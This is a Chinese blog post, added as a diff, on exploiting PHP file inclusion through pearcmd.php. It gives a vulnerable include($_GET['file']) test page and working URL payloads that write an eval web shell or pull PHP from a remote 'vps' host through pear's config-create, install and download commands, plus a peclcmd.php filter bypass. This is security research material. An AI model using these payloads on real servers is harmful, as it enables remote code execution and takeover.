@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] pearcmd.php文件包含妙用利用条件 php.ini中register_argc_argv&#x3D;On开启 安装pecl&#x2F;pear  pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。 不过，在Docker任意版本镜像中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tranquility">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/pearcmd.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%A6%99%E7%94%A8/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] pearcmd.php文件包含妙用利用条件 php.ini中register_argc_argv&#x3D;On开启 安装pecl&#x2F;pear  pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。 不过，在Docker任意版本镜像中">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242152281.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242225492.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242247218.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242249067.png">
+<meta property="article:published_time" content="2023-08-24T15:43:38.619Z">
+<meta property="article:modified_time" content="2023-07-24T14:58:56.159Z">
+<meta property="article:author" content="leekos">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242152281.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 23:43" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header"></h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年7月24日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="pearcmd-php文件包含妙用"><a href="#pearcmd-php文件包含妙用" class="headerlink" title="pearcmd.php文件包含妙用"></a>pearcmd.php文件包含妙用</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>php.ini中<code>register_argc_argv=On</code>开启</li>
+<li>安装<code>pecl/pear</code></li>
+</ul>
+<p><code>pecl</code>是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
+<p>不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>pear</code>这个工具其实是一个命令，默认安装路径：<code>/usr/local/lib/php/pearcmd.php</code>，在命令行可以使用<code>pear</code>或</p>
+<p><code>php /usr/local/lib/php/pearcmd.php</code>  运行，如果存在文件包含漏洞，就可以运行这个命令行工具</p>
+<p>我们看看<code>register_argc_argv</code>选项，如果这个选项设置为：<code>On</code>，那么<strong>URL的？后面的内容全部会传入<code>$_SERVER[&#39;argv&#39;]</code>这个变量中</strong>，无论后面内容是否有等号</p>
+<p><code>pear</code>会在<code>pearcmd.php</code>获取命令行参数</p>
+<p>pearcmd.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-string">&#x27;CLI&#x27;</span>);<br><span class="hljs-variable">$all_commands</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getCommands</span>();<br><br><span class="hljs-variable">$argv</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">readPHPArgv</span>();<br><span class="hljs-comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">php_sapi_name</span>() != <span class="hljs-string">&#x27;cli&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]) &amp;&amp; <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$argv</span> = <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$argv</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中会用到 <code>Console_Getopt::readPHPArgv()</code>函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPHPArgv</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$argv</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$argv</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>                <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;<br>                    <span class="hljs-keyword">return</span> PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-string">&quot;Console_Getopt: &quot;</span> . <span class="hljs-variable">$msg</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="hljs-string">&#x27;argv&#x27;</span>];<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$argv</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>首先尝试<code>$argv</code>变量（这个变量存储命令行模式运行php脚本传入的参数），然后尝试<code>$_SERVER[&#39;argv&#39;]</code>变量（这个变量传入URL的？后的值。<strong>可控</strong>）</p>
+<p>这样，在文件包含下，我们就可以运行<code>pear</code>工具，并且使用<code>GET</code>请求的参数来控制<code>pear</code>的命令行参数了</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>首先寻找<code>pear</code>中可以用的命令了：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Commands:<br>build                  Build an Extension <span class="hljs-keyword">From</span> C Source<br>bundle                 Unpacks a Pecl Package<br>channel-<span class="hljs-built_in">add</span>            <span class="hljs-built_in">Add</span> a Channel<br>channel-alias          Specify an alias <span class="hljs-keyword">to</span> a channel name<br>channel-delete         <span class="hljs-built_in">Remove</span> a Channel <span class="hljs-keyword">From</span> the List<br>channel-discover       Initialize a Channel <span class="hljs-keyword">from</span> its<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-<span class="hljs-built_in">info</span>           Retrieve Information on a Channel<br>channel-login          Connects <span class="hljs-keyword">and</span> authenticates <span class="hljs-keyword">to</span> remote channel<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-logout         Logs out <span class="hljs-keyword">from</span> the remote channel<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-update         Update an Existing Channel<br>clear-cache            Clear Web Services Cache<br>config-create          Create a<span class="hljs-built_in"> Default </span>configuration file<br>config-<span class="hljs-built_in">get</span>             Show One Setting<br>config-help            Show Information About Setting<br>config-<span class="hljs-built_in">set</span>             Change Setting<br>config-show            Show All<span class="hljs-built_in"> Settings</span><br><span class="hljs-built_in"></span>convert                Convert a package.xml 1.0 <span class="hljs-keyword">to</span> package.xml 2.0 format<br>cvsdiff                <span class="hljs-built_in">Run</span> a <span class="hljs-string">&quot;cvs diff&quot;</span> <span class="hljs-keyword">for</span> all files <span class="hljs-keyword">in</span> a package<br>cvstag                 <span class="hljs-built_in">Set</span> CVS Release Tag<br>download               Download Package<br>download-all           Downloads each available package <span class="hljs-keyword">from</span> the<span class="hljs-built_in"> default </span>channel<br><span class="hljs-built_in">info</span>                   Display information about a package<br>install                Install Package<br>list                   List Installed Packages <span class="hljs-keyword">In</span> The<span class="hljs-built_in"> Default </span>Channel<br>list-all               List All Packages<br>list-channels          List Available Channels<br>list-files             List Files <span class="hljs-keyword">In</span> Installed Package<br>list-upgrades          List Available Upgrades<br>login                  Connects <span class="hljs-keyword">and</span> authenticates <span class="hljs-keyword">to</span> remote<span class="hljs-built_in"> server </span>[Deprecated <span class="hljs-keyword">in</span> favor of channel-login]<br>logout                 Logs out <span class="hljs-keyword">from</span> the remote<span class="hljs-built_in"> server </span>[Deprecated <span class="hljs-keyword">in</span> favor of channel-logout]<br>makerpm                Builds an RPM spec file <span class="hljs-keyword">from</span> a PEAR package<br>package                Build Package<br>package-dependencies   Show package dependencies<br>package-validate       Validate Package Consistency<br>pickle                 Build PECL Package<br>remote-<span class="hljs-built_in">info</span>            Information About Remote Packages<br>remote-list            List Remote Packages<br>run-scripts            <span class="hljs-built_in">Run</span> Post-Install Scripts bundled with a package<br>run-tests              <span class="hljs-built_in">Run</span> Regression Tests<br>search                 Search remote package database<br>shell-test             Shell<span class="hljs-built_in"> Script </span>Test<br>sign                   Sign a package distribution file<br>svntag                 <span class="hljs-built_in">Set</span> SVN Release Tag<br>uninstall              Un-install Package<br>update-channels        Update the Channel List<span class="hljs-built_in"></span><br><span class="hljs-built_in">upgrade </span>              <span class="hljs-built_in"> Upgrade </span>Package<br>upgrade-all           <span class="hljs-built_in"> Upgrade </span>All Packages [Deprecated <span class="hljs-keyword">in</span> favor of calling<span class="hljs-built_in"> upgrade </span>with <span class="hljs-literal">no</span> parameters]<br>Usage: pear [options] command [command-options] &lt;parameters&gt;<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help options&quot;</span> <span class="hljs-keyword">to</span> list all options.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help shortcuts&quot;</span> <span class="hljs-keyword">to</span> list all command shortcuts.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help version&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;pear version&quot;</span> <span class="hljs-keyword">to</span> list version information.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help &lt;command&gt;&quot;</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> the help <span class="hljs-keyword">for</span> the specified command.<br></code></pre></td></tr></table></figure>
+
+<p>这里使用三种</p>
+<p>首先搭建一个环境：</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>并且在虚拟机中安装了<code>perl</code></p>
+<h4 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h4><p>首先来讲第一种方式，这个方式在 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p神</a>文章中讲到</p>
+<p>此命令的参数和用法如下：</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">config-<span class="hljs-keyword">create</span>: must have <span class="hljs-number">2</span> parameters, root <span class="hljs-keyword">path</span> <span class="hljs-keyword">and</span> filename <span class="hljs-keyword">to</span> save <span class="hljs-keyword">as</span><br></code></pre></td></tr></table></figure>
+
+<p>必须传入两个参数，第一个参数传入绝对路径，第二个参数传入想要保存的文件名</p>
+<p>我们先测试一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pear config-create <span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span> /tmp/leekos.php<br></code></pre></td></tr></table></figure>
+
+<p>结果提示：<code>Root directory must be an absolute path beginning with &quot;/&quot;, was: &quot;&lt;?=@eval($_POST[1]);?&gt;&quot;</code></p>
+<p>此处我们传入的第一个参数不是一个绝对路径，所以不行</p>
+<p>于是我们可以改为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pear config-create /<span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span> /tmp/leekos.php<br></code></pre></td></tr></table></figure>
+
+<p>成功写入：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242152281.png" srcset="/img/loading.gif" lazyload alt="image-20230724215227210"></p>
+<p>这样就可以利用该文件getshell了</p>
+<p>但是上述并不满足通过文件包含的格式来写入shell，我们需要更改一下：</p>
+<p>(由于<code>$_SERVER[&#39;argv&#39;]</code>变量会将URL的<code>?</code>后面的值都传入pear当作参数，所以此处<code>file</code>需要调换一下位置，并且在适当位置加上<code>/</code>和空格的url编码<code>+</code>) 我的虚拟机<code>pearcmd.php</code>的路径为：<code>/usr/share/php/pearcmd.php</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?+config-create+<span class="hljs-regexp">/&amp;file=/u</span>sr<span class="hljs-regexp">/share/</span>php<span class="hljs-regexp">/pearcmd.php&amp;/</span>&lt;?=@eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);?&gt;+<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>shell.php<br></code></pre></td></tr></table></figure>
+
+<p>这里会将：<code>/&amp;file=/usr/share/php/pearcmd.php&amp;/&lt;?=@eval($_POST[1]);?&gt;</code>当作一个目录，即第一个参数</p>
+<p>将这一串写入<code>/var/www/html/shell.php</code>中，然后包含这个php文件即可</p>
+<h4 id="install"><a href="#install" class="headerlink" title="install"></a>install</h4><p>假如在服务器上有一个<code>phpinfo.php</code>文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure>
+
+<p>我们可以使用如下命令下载服务器上的文件到靶机：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pear install http:<span class="hljs-regexp">//</span>vps/phpinfo.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242225492.png" srcset="/img/loading.gif" lazyload alt="image-20230724222546418"></p>
+<p>下载成功</p>
+<p>我们想要配合文件包含漏洞，就需要知道一个参数：<code>--installroot</code>，这个选项可以指定安装目录，这样就可以构造payload远程下载文件了：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+install+</span>--installroot<span class="hljs-code">+&amp;file=/usr/share/php/pearcmd.php&amp;+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]/index.php<br></code></pre></td></tr></table></figure>
+
+<p>这一条命令会将服务器上的 <code>index.php</code>下载到：</p>
+<p><code>&amp;file=/usr/local/lib/php/pearcmd.php&amp;/tmp/pear/download/</code>目录下（后面要拼接上<code>/tmp/pear/download/</code>）</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242247218.png" srcset="/img/loading.gif" lazyload alt="image-20230724224711149"></p>
+<p>这样我们就可以从远程服务器上下载shell到靶机上了，使用文件包含注意将路径url编码</p>
+<h4 id="download"><a href="#download" class="headerlink" title="download"></a>download</h4><p>用法：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pear down http:<span class="hljs-regexp">//</span>vps/phpinfo.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202307242249067.png" srcset="/img/loading.gif" lazyload alt="image-20230724224940015"></p>
+<p>我们也可以尝试构造一下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?+download+http:<span class="hljs-regexp">//</span>vps<span class="hljs-regexp">/phpinfo.php&amp;file=/u</span>sr<span class="hljs-regexp">/share/</span>php/pearcmd.php<br></code></pre></td></tr></table></figure>
+
+<p>这种构造方式有点巧妙，需要我们在服务器建一个目录：<code>phpinfo.php&amp;file=/usr/share/php/</code>，并且将恶意的php命名为：<code>pearcmd.php</code></p>
+<p>其实也可以这么写，去掉上面的<code>phpinfo.php</code>：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?+download+http:<span class="hljs-regexp">//</span>vps<span class="hljs-regexp">/&amp;file=/u</span>sr<span class="hljs-regexp">/share/</span>php/pearcmd.php<br></code></pre></td></tr></table></figure>
+
+<p>创建：<code>&amp;file=/usr/share/php/</code>目录，放入<code>pearcmd.php</code></p>
+<p>然后文件包含<code>pearcmd.php</code>就可以利用了</p>
+<h3 id="pearcmd关键词被ban"><a href="#pearcmd关键词被ban" class="headerlink" title="pearcmd关键词被ban"></a>pearcmd关键词被ban</h3><p>我们可以使用<code>peclcmd.php</code>代替，在这个php文件当中其实就是引入了<code>pearcmd.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;/www/server/php/52/lib/php&#x27;</span> != <span class="hljs-string">&#x27;@&#x27;</span>.<span class="hljs-string">&#x27;include_path&#x27;</span>.<span class="hljs-string">&#x27;@&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;include_path&#x27;</span>, <span class="hljs-string">&#x27;/www/server/php/52/lib/php&#x27;</span>);<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">false</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;PEAR_RUNTYPE&#x27;</span>, <span class="hljs-string">&#x27;pecl&#x27;</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;pearcmd.php&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
